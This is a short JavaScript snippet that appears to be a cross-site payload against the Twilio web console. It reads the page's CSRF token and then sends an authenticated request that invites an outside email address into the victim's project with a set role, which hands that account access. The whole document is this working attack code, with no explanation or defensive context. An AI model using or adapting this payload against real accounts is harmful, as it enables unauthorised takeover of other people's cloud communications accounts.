let req = new XMLHttpRequest();
let url = "https://www.twilio.com/console?__override_layout__=embed";
req.open("GET", url);
req.send();
req.onload = function (e) {
if (req.readyState === XMLHttpRequest.DONE && req.status === 200) {
    page = req.responseText;
    var token = (page.match(/name="csrfToken" content="(.*?)"/)[0].replace('name="csrfToken" content="', '').replace('"', '') );
    }
       var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/www.twilio.com\/console\/project\/settings\/invitations", true);
        xhr.setRequestHeader("Content-Type", "application\/json");
        xhr.setRequestHeader("Accept", "application\/json, text\/plain, *\/*");
        xhr.setRequestHeader("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8");
        xhr.setRequestHeader("X-Twilio-Csrf", token);
        xhr.withCredentials = true;
        var body = "{\"email\":\"hxo1@pm.me\",\"roles\":[\"RL00000000000000000000000000000002\"]}";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
}
